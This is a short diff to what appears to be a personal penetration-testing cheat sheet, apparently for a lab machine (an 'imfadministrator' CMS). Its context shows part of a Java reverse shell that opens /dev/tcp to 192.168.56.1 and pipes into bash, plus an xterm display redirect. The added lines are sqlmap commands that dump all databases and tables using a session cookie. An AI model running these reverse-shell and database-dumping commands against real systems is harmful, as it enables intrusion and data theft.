@@ -681,7 +681,7 @@ echo "SELECT hostname from sensor;" | mysql -u root -p snort
 ip route
 Environmental variables
 
-zsh
+
 typeset
 printenv
 typeset type
@@ -809,3 +809,12 @@ p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/192.168.56.1/443;cat <&5 | while 
 p.waitFor()
 
 xterm -display 192.168.56.1:1
+
+
+
+________sqlmap
+dump all databases
+ sqlmap -v -u http://192.168.0.107/imfadministrator/cms.php\?pagename\=home --cookie "PHPSESSID=tbn4jch12210r7dc7pusdo9p16"  --dbs
+dump tables
+sqlmap -v -u http://192.168.0.107/imfadministrator/cms.php\?pagename\=home --cookie "PHPSESSID=tbn4jch12210r7dc7pusdo9p16" -D mysql --tables --dump --level=2 --risk=3
+tcpdump src <host ip>
